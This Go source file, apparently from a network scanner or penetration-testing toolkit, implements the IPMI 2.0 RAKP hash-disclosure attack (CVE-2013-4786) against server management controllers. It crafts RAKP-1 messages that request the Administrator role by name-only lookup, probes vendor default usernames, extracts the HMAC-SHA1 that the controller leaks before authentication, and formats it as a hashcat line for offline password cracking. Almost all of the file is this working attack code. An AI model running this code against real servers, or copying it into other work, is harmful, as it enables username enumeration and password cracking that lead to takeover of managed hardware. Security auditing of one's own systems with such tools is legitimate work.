package ipmi

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
)

// RAKPNonceSize is the fixed size of the 16-byte random nonces both
// sides contribute to the RAKP exchange (per IPMI 2.0 §13.20).
const RAKPNonceSize = 16

// HMACSHA1AuthCodeSize is the length of the RAKP-2 key-exchange-
// authentication-code when the negotiated algorithm is HMAC-SHA1 (the
// algorithm CVE-2013-4786 disclosures use).
const HMACSHA1AuthCodeSize = 20

// rakp1NameLookupAdmin sets bit [4] (name-only lookup) and bits [3:0]
// = 4 (Administrator) in the requested-role field. Name-only lookup
// is what makes the existence oracle work — the BMC accepts the
// RAKP-1 message based on the username alone, then returns the
// HMAC-SHA1 over the user's password salt in RAKP-2 without
// requiring proof that we know the password.
const rakp1NameLookupAdmin byte = 0x14

// MaxUsernameLength is the IPMI 2.0 spec maximum (§22.32). Anything
// longer is rejected client-side rather than producing a malformed
// RAKP-1.
const MaxUsernameLength = 16

// DefaultUsernameGuesses is the built-in list of vendor defaults the
// RAKP existence oracle probes when the caller doesn't supply one.
// Covers Dell iDRAC ("root"), Supermicro ("ADMIN"), HP iLO/MegaRAC
// ("admin"), the IPMI spec example user ("Administrator"), and IBM /
// Lenovo / classic IPMI ("USERID").
var DefaultUsernameGuesses = []string{"admin", "root", "Administrator", "ADMIN", "USERID"}

// GenerateConsoleNonce returns 16 cryptographically random bytes for
// the Rm field of RAKP-1. Random data prevents BMC-side replay.
func GenerateConsoleNonce() ([RAKPNonceSize]byte, error) {
	var n [RAKPNonceSize]byte
	if _, err := rand.Read(n[:]); err != nil {
		return n, fmt.Errorf("rakp: generating console nonce: %w", err)
	}
	return n, nil
}

// GenerateConsoleSessionID returns a non-zero 32-bit identifier for
// the console-side of the Open Session exchange. Must be non-zero.
func GenerateConsoleSessionID() (uint32, error) {
	var buf [4]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return 0, fmt.Errorf("rakp: generating console session ID: %w", err)
	}
	v := binary.LittleEndian.Uint32(buf[:])
	if v == 0 {
		// Astronomically unlikely; pick something deterministic so we
		// never violate the non-zero invariant.
		v = 0xA1A1A1A1
	}
	return v, nil
}

// BuildRAKPMessage1 assembles the RAKP-1 payload. bmcSessionID is the
// session ID the BMC chose in its Open Session Response. The
// requested-role byte uses name-only lookup + Administrator so the
// BMC will respond with the HMAC even if the username has lower
// privileges than admin.
func BuildRAKPMessage1(messageTag byte, bmcSessionID uint32, consoleNonce [RAKPNonceSize]byte, username string) ([]byte, error) {
	if len(username) > MaxUsernameLength {
		return nil, fmt.Errorf("rakp: username %q exceeds %d-byte spec maximum", username, MaxUsernameLength)
	}

	// Payload layout: tag(1) + reserved(3) + bmc_sid(4) + Rm(16) +
	// role(1) + reserved(2) + ulen(1) + username(N).
	payload := make([]byte, 0, 28+len(username))
	payload = append(payload, messageTag, 0x00, 0x00, 0x00)
	var sid [4]byte
	binary.LittleEndian.PutUint32(sid[:], bmcSessionID)
	payload = append(payload, sid[:]...)
	payload = append(payload, consoleNonce[:]...)
	payload = append(payload, rakp1NameLookupAdmin)
	payload = append(payload, 0x00, 0x00)
	payload = append(payload, byte(len(username)))
	payload = append(payload, []byte(username)...)

	rmcp := BuildRMCPHeader()
	sess := BuildIPMI20SessionHeader(PayloadTypeRAKPMessage1, 0, 0, uint16(len(payload)))

	out := make([]byte, 0, len(rmcp)+len(sess)+len(payload))
	out = append(out, rmcp...)
	out = append(out, sess...)
	out = append(out, payload...)
	return out, nil
}

// RAKPMessage2 is the parsed RAKP-2 response payload. The
// KeyExchangeAuthCode field is the HMAC-SHA1 that CVE-2013-4786
// discloses pre-auth — it is keyed with the user's password.
type RAKPMessage2 struct {
	MessageTag          byte
	StatusCode          byte
	ConsoleSessionID    uint32
	BMCNonce            [RAKPNonceSize]byte
	BMCGUID             [16]byte
	KeyExchangeAuthCode []byte // 20 bytes for HMAC-SHA1
}

// Success reports whether the RAKP-2 came back with status 0x00 — the
// indicator that the username exists and the BMC returned a useful
// HMAC. Status 0x0D ("unauthorized name") means the user does not
// exist; that's still useful (it confirms the absence) but the hash
// fields will be empty.
func (m RAKPMessage2) Success() bool { return m.StatusCode == RMCPPlusStatusNoErrors }

// ParseRAKPMessage2 reads the RAKP-2 payload returned by the BMC.
func ParseRAKPMessage2(resp []byte) (RAKPMessage2, error) {
	payload, err := ParseIPMI20Payload(resp, PayloadTypeRAKPMessage2)
	if err != nil {
		return RAKPMessage2{}, err
	}
	// Minimum payload for a status-only error reply is 8 bytes
	// (tag+status+resv+SID_C). Successful replies are 40 + KEC
	// (typically 60 bytes for HMAC-SHA1).
	if len(payload) < 8 {
		return RAKPMessage2{}, fmt.Errorf("%w: RAKP-2 payload %d bytes", ErrTruncatedResponse, len(payload))
	}
	m := RAKPMessage2{
		MessageTag:       payload[0],
		StatusCode:       payload[1],
		ConsoleSessionID: binary.LittleEndian.Uint32(payload[4:8]),
	}
	// On non-success responses the BMC may stop after the SID echo.
	// On success it continues with the nonce/GUID/HMAC.
	if !m.Success() {
		return m, nil
	}
	// The deep probe negotiates HMAC-SHA1 (cipher suite 3), so the
	// success reply must carry a 20-byte key-exchange-authentication-
	// code at offsets 40-59. A status-0x00 reply that's shorter is
	// either a truncation or a misbehaving BMC; either way we mustn't
	// propagate it as a "valid" disclosure (hashcat -m 7300 would
	// reject the line, and our existence-oracle field would lie about
	// whether the BMC actually disclosed crackable material).
	if len(payload) < 40+HMACSHA1AuthCodeSize {
		return m, fmt.Errorf("%w: RAKP-2 success reply needs >=%d bytes, got %d",
			ErrTruncatedResponse, 40+HMACSHA1AuthCodeSize, len(payload))
	}
	copy(m.BMCNonce[:], payload[8:24])
	copy(m.BMCGUID[:], payload[24:40])
	// Slice to HMACSHA1AuthCodeSize rather than copying to end-of-
	// payload: BMCs that send trailing padding or junk after the
	// auth code should not contaminate the crackable blob.
	m.KeyExchangeAuthCode = append([]byte(nil), payload[40:40+HMACSHA1AuthCodeSize]...)
	return m, nil
}

// FormatHashcatLine produces a hashcat -m 7300 (IPMI2 RAKP HMAC-SHA1)
// formatted blob from the captured RAKP material. The format
// `username:salt:hmac` is documented by hashcat's example_hashes.md and
// matches what Metasploit's ipmi_dumphashes module emits.
//
// salt = SID_M || SID_C || Rm || Rc || GUIDc || ROLEm || ULENGTHm || UNAMEM,
// all hex-lowercase, and hmac is the 20-byte HMAC-SHA1 hex-lowercase.
func FormatHashcatLine(username string, bmcSessionID, consoleSessionID uint32,
	consoleNonce, bmcNonce, bmcGUID []byte, role byte, hmac []byte) string {
	if hmac == nil {
		return ""
	}
	saltSize := 4 + 4 + len(consoleNonce) + len(bmcNonce) + len(bmcGUID) + 1 + 1 + len(username)
	salt := make([]byte, 0, saltSize)
	var sidBuf [4]byte
	binary.LittleEndian.PutUint32(sidBuf[:], bmcSessionID)
	salt = append(salt, sidBuf[:]...)
	binary.LittleEndian.PutUint32(sidBuf[:], consoleSessionID)
	salt = append(salt, sidBuf[:]...)
	salt = append(salt, consoleNonce...)
	salt = append(salt, bmcNonce...)
	salt = append(salt, bmcGUID...)
	salt = append(salt, role)
	salt = append(salt, byte(len(username)))
	salt = append(salt, []byte(username)...)
	return fmt.Sprintf("%s:%s:%s", username, hex.EncodeToString(salt), hex.EncodeToString(hmac))
}

// HashcatRoleByte is the role byte we feed into FormatHashcatLine. It
// must match what we put on the wire in RAKP-1 or the salt won't
// reproduce the BMC's HMAC inputs.
const HashcatRoleByte = rakp1NameLookupAdmin
